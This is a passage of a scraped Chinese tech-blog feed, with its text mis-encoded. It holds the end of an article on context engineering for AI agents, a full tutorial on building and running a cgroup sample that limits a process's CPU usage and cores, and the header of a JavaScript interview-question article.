<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºå­Agentç¼ºå°‘ä¸»Agentçš„ä¸Šä¸‹æ–‡ï¼Œé™¤äº†å›ç­”é‚£äº›å®šä¹‰éå¸¸æ¸…æ™°çš„é—®é¢˜ï¼Œå…¶ä»–ä»»åŠ¡å°±æ— æ³•åšã€‚è€Œå¦‚æœè®©å¤šä¸ªå¹¶è¡Œçš„å­Agentåä½œï¼Œç»“æœå¯èƒ½äº’ç›¸å†²çªï¼Œå¯¼è‡´åœ¨Agentæ¶æ„ä¸Šé‡åˆ°ä¹‹å‰è¯´çš„å¯é æ€§é—®é¢˜ã€‚</p>
<p>åœ¨Claude Codeçš„è®¾è®¡é‡Œï¼Œå­Agentçš„å…¨éƒ¨è°ƒç ”å·¥ä½œä¸éœ€è¦ç•™åœ¨ä¸»Agentçš„å†å²è®°å½•ä¸­ï¼Œè¿™æ ·å¯ä»¥æ›´é•¿æ—¶é—´ä¿ç•™ä¸Šä¸‹æ–‡ã€‚è®¾è®¡è€…åˆ»æ„é‡‡ç”¨äº†ç®€åŒ–æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-6">Edit Apply æ¨¡å‹</h3>
<p>2024å¹´ï¼Œè®¸å¤šæ¨¡å‹åœ¨ç¼–è¾‘ä»£ç ä¸Šçš„è¡¨ç°éå¸¸å·®ã€‚å¾ˆå¤šCoding Agentã€IDEã€App Builder ç­‰ï¼ˆåŒ…æ‹¬ Devinï¼‰ï¼Œéƒ½é‡‡ç”¨äº†â€œedit apply modelâ€ï¼ˆç¼–è¾‘åº”ç”¨æ¨¡å‹ï¼‰ã€‚</p>
<p>æ ¸å¿ƒæ€è·¯æ˜¯ï¼Œä¸å…¶è®©å¤§æ¨¡å‹è¾“å‡ºæ ¼å¼æ­£ç¡®çš„diffï¼Œä¸å¦‚è®©å°æ¨¡å‹æ ¹æ®Markdownæ ¼å¼çš„ç¼–è¾‘è¯´æ˜é‡å†™æ•´ä¸ªæ–‡ä»¶æ¥å¾—å¯é ã€‚</p>
<p>æ‰€ä»¥å®é™…æ“ä½œä¸­ï¼Œå¼€å‘è€…è®©å¤§æ¨¡å‹è¾“å‡ºMarkdownè¯´æ˜ä»£ç æ”¹åŠ¨ï¼Œç„¶åæŠŠè¿™äº›è¯´æ˜äº¤ç»™å°æ¨¡å‹æ¥é‡å†™æ–‡ä»¶ã€‚ä½†è¿™ç§ç³»ç»Ÿä»ç„¶å®¹æ˜“å‡ºé”™ã€‚æ¯”å¦‚ï¼Œå°æ¨¡å‹å¯èƒ½ä¼šé”™è¯¯ç†è§£å¤§æ¨¡å‹çš„æŒ‡ä»¤ï¼Œåªè¦æŒ‡ä»¤ä¸­ç¨æœ‰æ­§ä¹‰ï¼Œå°±ä¼šå¯¼è‡´é”™è¯¯ç¼–è¾‘ã€‚ç°åœ¨ï¼Œä»£ç ç¼–è¾‘å’Œåº”ç”¨æ›´å¤šæ˜¯ç”±ä¸€ä¸ªæ¨¡å‹ä¸€æ­¥å®Œæˆã€‚</p>
<h3 data-id="heading-7">å¤š Agent åä½œ</h3>
<p>å¦‚æœçœŸè¦è®©ç³»ç»Ÿå¹¶è¡Œå¤„ç†ä»»åŠ¡ï¼Œä½ å¯èƒ½ä¹Ÿä¼šæƒ³åˆ°è®©å†³ç­–è€…ä¹‹é—´â€œäº’ç›¸æ²Ÿé€šâ€å…±åŒè§£å†³é—®é¢˜ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯äººç±»é‡åˆ°åˆ†æ­§ï¼ˆç†æƒ³æƒ…å†µä¸‹ï¼‰ä¼šåšçš„äº‹ã€‚å¦‚æœå·¥ç¨‹å¸ˆ A çš„ä»£ç ä¸å·¥ç¨‹å¸ˆ B çš„ä»£ç å‘ç”Ÿåˆå¹¶å†²çªï¼Œæ ‡å‡†æµç¨‹å°±æ˜¯å¤§å®¶ç›¸äº’äº¤æµï¼Œè¾¾æˆä¸€è‡´ã€‚ä½†æ—¶è‡³ä»Šæ—¥ï¼ŒAI Agentä¹‹é—´å°šä¸å…·å¤‡åƒäººä¸€æ ·ï¼Œèƒ½åœ¨è¶…é•¿ä¸Šä¸‹æ–‡ä¸‹é«˜å¯é æ€§åœ°ä¸»åŠ¨æ²Ÿé€šã€‚</p>
<p>è‡ªä»ChatGPTæ¨å‡ºåï¼Œå¤§å®¶ä¸€ç›´åœ¨æ¢ç´¢å¤š Agent äº¤äº’åä½œæ¥è§£å†³é—®é¢˜ã€‚ä»é•¿æœŸæ¥çœ‹ï¼ŒAgentåä½œçš„é•¿æœŸå¾ˆä¹è§‚ï¼Œä½†ç›®å‰å¤šAgentåä½œç³»ç»Ÿè¿˜æ˜¯éå¸¸è„†å¼±ã€‚è¿˜å­˜åœ¨å†³ç­–å¤ªåˆ†æ•£ï¼ŒAgentä¹‹é—´ä¸Šä¸‹æ–‡ä¹Ÿæ— æ³•å……åˆ†å…±äº«ç­‰é—®é¢˜ã€‚</p>
<p>å½“ç„¶ï¼Œæœªæ¥å•çº¿ç¨‹Agentå’Œäººç±»æ²Ÿé€šè¶Šæ¥è¶Šé¡ºç•…åï¼Œè¿™ä¸ªéš¾é¢˜è‡ªç„¶è€Œç„¶å°±ä¼šè§£å†³ã€‚é‚£æ—¶å€™ä¼šå½»åº•é‡Šæ”¾æ›´é«˜å¹¶è¡Œåº¦å’Œæ•ˆç‡ã€‚</p>
<h2 data-id="heading-8">å°ç»“</h2>
<p>è¿™äº›å…³äºä¸Šä¸‹æ–‡å·¥ç¨‹çš„è§‚å¯Ÿå’Œè®¨è®ºï¼Œåªæ˜¯æœªæ¥æˆä¸ºAgentæ„å»ºæ ‡å‡†åŸåˆ™çš„ä¸€ä¸ªèµ·ç‚¹ã€‚å®é™…ä¸Šè¿˜æœ‰å¾ˆå¤šå„ç§æŒ‘æˆ˜å’ŒæŠ€æœ¯æ²¡è®¨è®ºã€‚åŒæ—¶ï¼ŒAgentæ„å»ºä¹Ÿæ˜¯éå¸¸é‡è¦çš„å‰æ²¿æ–¹å‘ã€‚</p>
<p>æˆ‘ä»¬åœ¨å®è·µä¸­ï¼Œå¯ä»¥åˆ©ç”¨æœ¬æ–‡æåˆ°çš„ä¸€äº›åŸåˆ™å’Œè§£å†³æ–¹æ¡ˆï¼ŒæŒ‡å¯¼å†…éƒ¨å·¥å…·å’Œæ¡†æ¶çš„å¼€å‘ï¼Œé€šè¿‡å®è·µå’Œæ€»ç»“æ¥ä¸æ–­å®Œå–„Agentå·¥ç¨‹çš„è½åœ°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾ç¨‹ 6 | cgroup sample]]></title>    <link>https://juejin.cn/post/7592622563547004963</link>    <guid>https://juejin.cn/post/7592622563547004963</guid>    <pubDate>2026-01-08T12:24:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592622563547004963" data-draft-id="7592637149697572899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾ç¨‹ 6 | cgroup sample"/> <meta itemprop="keywords" content="è‡ªåŠ¨é©¾é©¶,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-08T12:24:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åœ°å¹³çº¿å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/1257497032132567"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾ç¨‹ 6 | cgroup sample
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1257497032132567/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åœ°å¹³çº¿å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:24:38.000Z" title="Thu Jan 08 2026 12:24:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. åŠŸèƒ½æ¦‚è¿°</h2>
<p>æœ¬ sample å®ç°é™åˆ¶è¿›ç¨‹ cpu å ç”¨ç‡å’Œè¿è¡Œçš„ cpu æ ¸åŠŸèƒ½ï¼Œæ­¤å¤„ä¸»è¦ä»‹ç»è¯¥ sample çš„å®ç°ä¸ä½¿ç”¨æ–¹æ³•ã€‚</p>
<h3 data-id="heading-1">1.1. è½¯ä»¶æ¶æ„è¯´æ˜</h3>
<p>æœ¬ sample åŸºäº Linux é€šç”¨çš„ cgroup APIï¼Œé€šè¿‡æ“ä½œ cgroup çš„ cpu å­ç³»ç»Ÿå’Œ cpuset å­ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œæ¥é™åˆ¶ sample è¿›ç¨‹çš„ cpu å ç”¨ç‡å’Œè¿è¡Œçš„ cpu æ ¸ã€‚</p>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=NWFiMWM1MmNjMzAyN2Q0MmUyNzYzNDkzZjQ5ODUxZGVfRTV0M014ZjFKd0JIY1ZVMDlNVGJsQnZLYm8yV3lGR3JfVG9rZW46UmozYmI1MGJib1lDa0p4ZjRwamNpMlI3bjdjXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">1.2. ä»£ç ä½ç½®ä¸ç›®å½•ç»“æ„</h3>
<p>æœ¬ sample ä»£ç ä½ç½®å’Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<p>ä»£ç ä½ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">{sdk<span class="hljs-emphasis">_dir}/test/samples/platform_</span>samples/source/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample
</span></code></pre>
<p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â”œâ”€â”€ Kconfig
â”œâ”€â”€ Makefile
â”œâ”€â”€ Makefile.in
â””â”€â”€ src
<span class="hljs-code">    â”œâ”€â”€ cgroup_sample.c
    â””â”€â”€ Makefile
</span></code></pre>
<h3 data-id="heading-3">1.3. API æµç¨‹è¯´æ˜</h3>
<p>ä»¥ä¸‹ä¸º sample å†… API è°ƒç”¨æµç¨‹å›¾ï¼š</p>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=NDE1MmJkYjYxOWZjYzZmYTI4ODNiNDViNmMwMDlhNDlfNGF5YUZ0OWxlbG1XeEx5cEVESVRhR2h0Szd0UVF1QU5fVG9rZW46R1dncmJLNGFWbzVpSzN4VXBtN2NhcDEybjdiXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">2. ç¼–è¯‘</h2>
<h3 data-id="heading-5">2.1. ç¼–è¯‘ç¯å¢ƒ</h3>
<p>æœ¬ sample çš„ç¼–è¯‘ç¯å¢ƒä½¿ç”¨ SDK ä¸­çš„ build å·¥å…·ï¼Œè¯·å‚è€ƒï¼š <a href="https://link.juejin.cn?target=http%3A%2F%2F10.106.32.73%2Fdoc%2FLNX-PL4.0-WB-20250724-J6P%2Fcn%2Fhtml%2Fj6_sysdev%2Fbuild%2Fj6_sysdev_build.html%23id1" target="_blank" title="http://10.106.32.73/doc/LNX-PL4.0-WB-20250724-J6P/cn/html/j6_sysdev/build/j6_sysdev_build.html#id1" ref="nofollow noopener noreferrer">Build ç¯å¢ƒå»ºç«‹</a>ã€‚</p>
<h3 data-id="heading-6">2.2. ç¼–è¯‘è¯´æ˜</h3>
<p>æœ¬ sample çš„ç¼–è¯‘ä¾èµ–å°è£… Linux cgroup API é“¾æ¥åº“ libhbcgroup æä¾›çš„å¤´æ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">#include "hb<span class="hljs-emphasis">_cgroup.h"
</span></span></code></pre>
<p>ç¼–è¯‘ä¾èµ–çš„åº“ä¸ºï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">LIBS += -lhbcgroup
</code></pre>
<p>ç¼–è¯‘å‘½ä»¤ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">è¿›å…¥SDKæ‰€æœ‰ç›®å½•{sdk<span class="hljs-emphasis">_dir}ï¼Œå¹¶sourceæ„å»ºç¯å¢ƒï¼ˆå‚è§ä¸Šæ–‡ï¼šç¼–è¯‘ç¯å¢ƒï¼‰ã€‚# ç¼–è¯‘æœ¬sample:
bdm cgroup_</span>sample
<span class="hljs-section"># è¾“å‡ºè·¯å¾„:{sdk<span class="hljs-emphasis">_dir}/out/debug-gcc_</span>{gcc<span class="hljs-emphasis">_version}/build/test/samples/platform_</span>samples/source/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample
</span></span></code></pre>
<h2 data-id="heading-7">3. è¿è¡Œ</h2>
<h3 data-id="heading-8">3.1. æ”¯æŒå¹³å°</h3>
<p>å¾ç¨‹ 6X Matrix</p>
<h3 data-id="heading-9">3.2. æ¿ç«¯éƒ¨ç½²åŠé…ç½®</h3>
<p>æœ¬ sample çš„å¯æ‰§è¡Œæ–‡ä»¶ä½äºæ¿ç«¯å¦‚ä¸‹è·¯å¾„ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample
</code></pre>
<h3 data-id="heading-10">3.3. è¿è¡ŒæŒ‡å—</h3>
<h4 data-id="heading-11">3.3.1. <strong>è¿è¡Œå‚æ•°è¯´æ˜</strong></h4>
<p>ä¸‹é¢çš„è¡¨æ ¼æ˜¯ cgroup_sample å…·ä½“å‚æ•°çš„è¯´æ˜ï¼š</p>
<p>å¦‚æœ-c å’Œ-C éƒ½ä¸é€‰æ‹©ï¼Œåˆ™ä¸ä¼šé™åˆ¶ cgroup_sample è¿›ç¨‹çš„ cpu å ç”¨ç‡å’Œè¿è¡Œçš„ cpu æ ¸ã€‚</p>
<h4 data-id="heading-12">3.3.2. <strong>å¸®åŠ©èœå•</strong></h4>
<pre><code class="hljs language-markdown" lang="markdown">Usage: cgroup<span class="hljs-emphasis">_sample [OPTION]

-c  Limit cpu occupancy rate, 1 ~ 100.
-C  Limit cpu core.
-t  Delay time, 1's default.
-h  Show usage.

Without options, do nothing.
</span></code></pre>
<h4 data-id="heading-13">3.3.3. <strong>è¿è¡Œæ–¹æ³•</strong></h4>
<p>æ‰§è¡Œå‘½ä»¤ç¤ºä¾‹ï¼š</p>
<p>é™åˆ¶ cgroup_sample è¿›ç¨‹çš„ cpu å ç”¨ç‡ä¸º 20%ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -c 20
</code></pre>
<p>é™åˆ¶ cgroup_sample è¿›ç¨‹åªè¿è¡Œåœ¨ cpu æ ¸ 2ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -C 2
</code></pre>
<p>é™åˆ¶ cgroup_sample è¿›ç¨‹è¿è¡Œåœ¨ cpu æ ¸ 1ï¼Œ4ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -C 1,4
</code></pre>
<h4 data-id="heading-14">3.3.4. <strong>è¿è¡Œç»“æœè¯´æ˜</strong></h4>
<p>è¿è¡Œæœ¬ sample åï¼Œå¯é€šè¿‡ top å‘½ä»¤éªŒè¯æœ¬ sample è¿›ç¨‹çš„ cpu å ç”¨ç‡å’Œè¿è¡Œçš„ cpu æ ¸ã€‚</p>
<p><strong>è¿è¡Œç»“æœ 1</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">root@hobot:~# /app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -c 20 -C 2 -t 20 &amp;[1] 1514
</code></pre>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=NzIyODNhZjNmZTkxZDZlYmRhNjZiMWI5Mjg5MzdmMDZfbTgycU9heVQ5aWdHM002Z3ltQUxXaXk1c0NDNnFFUmxfVG9rZW46UGM5RGJkcERsbzRTdFd4ZnFtUmNQS0RYblZoXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<p><strong>è¿è¡Œç»“æœ 2</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">root@hobot:~# /app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -c 20 -C 1,4 -t 20 &amp;[1] 1522
</code></pre>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=MGUwY2MzNjE1MjQ0OTc0YjUxMDg2YmNiOWQ5YjFmYjRfVVdVd09oMXkxRDl4MlpQb2FhTjVPU1pUVjB3NUVqTWJfVG9rZW46SExTRWJqSkxQb0RoVlR4WTZiU2NMTnlibnBoXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<p><strong>ç‰¹åˆ«è¯´æ˜</strong></p>
<p>æŸ¥çœ‹ cpu æ ¸ï¼Œåœ¨æ‰§è¡Œ top å‘½ä»¤åï¼Œéœ€è¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p>
<ol>
<li>æŒ‰ f é”®ï¼Œå¼¹å‡ºç®¡ç†çª—å£ï¼›</li>
<li>æŒ‰ä¸Šä¸‹é”®é€‰æ‹©ä¸‹å›¾æŒ‡ç¤ºçš„å±æ€§ Pï¼›</li>
<li>æŒ‰ç©ºæ ¼é”®é€‰ä¸­è¯¥å±æ€§ï¼ˆé€‰ä¸­åä¼šé«˜äº®ï¼‰ï¼›</li>
<li>æŒ‰ q é”®é€€å‡ºï¼›</li>
</ol>
<p>å³å¯æ˜¾ç¤ºè¿›ç¨‹è¿è¡Œçš„ cpu æ ¸ã€‚</p>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=MWEzYmUzNGEwZDFiOGNmODA1ZjBhZTEzM2RmMTg0NmFfWWIzNk1CR0JHNVAxT0RYOEtSUWdsTGdybGxrbnlJeFdfVG9rZW46VzRIcWIzWGJIb2l6YlN4bGxESWNURXNhbmxiXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»ä¸€é“å‰ç«¯é¢è¯•é¢˜ï¼Œè°ˆ JS å¯¹è±¡å­˜å‚¨ç‰¹ç‚¹å’Œè¿ç®—ç¬¦æ‰§è¡Œé¡ºåº]]></title>    <link>https://juejin.cn/post/7592637149697622051</link>    <guid>https://juejin.cn/post/7592637149697622051</guid>    <pubDate>2026-01-08T12:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592637149697622051" data-draft-id="7592856733182607396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»ä¸€é“å‰ç«¯é¢è¯•é¢˜ï¼Œè°ˆ JS å¯¹è±¡å­˜å‚¨ç‰¹ç‚¹å’Œè¿ç®—ç¬¦æ‰§è¡Œé¡ºåº"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T12:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å°å¯’"/> <meta itemprop="url" content="https://juejin.cn/user/694547078987287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»ä¸€é“å‰ç«¯é¢è¯•é¢˜ï¼Œè°ˆ JS å¯¹è±¡å­˜å‚¨ç‰¹ç‚¹å’Œè¿ç®—ç¬¦æ‰§è¡Œé¡ºåº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547078987287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å°å¯’
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:44:56.000Z" title="Thu Jan 08 2026 12:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
